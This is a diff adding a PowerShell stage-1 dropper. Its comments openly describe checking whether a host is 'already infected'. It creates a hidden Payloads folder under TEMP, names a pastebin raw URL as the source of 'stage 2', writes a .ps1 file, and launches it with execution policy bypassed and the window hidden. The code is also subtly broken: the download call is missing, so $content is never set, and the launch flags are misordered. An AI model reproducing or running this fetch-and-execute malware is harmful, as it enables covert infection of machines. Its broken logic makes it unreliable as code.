@@ -1,0 +1,37 @@
+# Define the stage 2 path and file name
+$targetPath = Join-Path -Path $env:TEMP -ChildPath "Payloads"
+$stage2File = Join-Path -Path $targetPath -ChildPath "y9CNLxq6.ps1"
+$stage2Url = "https://pastebin.com/raw/y9CNLxq6"
+
+# Check if host is already infected
+if (Test-Path -Path $stage2File -PathType Leaf) {
+    # Debug Code: 
+    Write-Host "File already exists at $stage2File. Exiting script."
+    exit
+}
+# If the file doesn't exist, create the directory if necessary
+else  {
+    if (-not (Test-Path -Path $targetPath -PathType Container)) {
+        # Debug Code: 
+        Write-Host "Directory not found. Creating $targetPath..."
+        New-Item -Path $targetPath -ItemType Directory | Out-Null
+    }
+    
+    # Download, write, and execute stage 2
+    try {
+        # Debug Code: 
+        Write-Host "File not found. Downloading content from $stage2Url..."
+        $content.Content | Out-File -FilePath $stage2File -Encoding UTF8
+        $content | Out-File -FilePath $stage2File -Encoding UTF8
+        # Debug Code: 
+        Write-Host "Content successfully written to $stage2File."
+        Start-Process powershell.exe -ArgumentList "-File $stage2File", "-ExecutionPolicy Bypass", "-WindowStyle Hidden"
+        # Debug Code:
+         Write-Host "Executing stage 2 $stage2File......"
+    }
+    catch {
+        # Debug Code: 
+        Write-Error "An error occurred during download or file writing: $_"
+        exit
+    }
+}
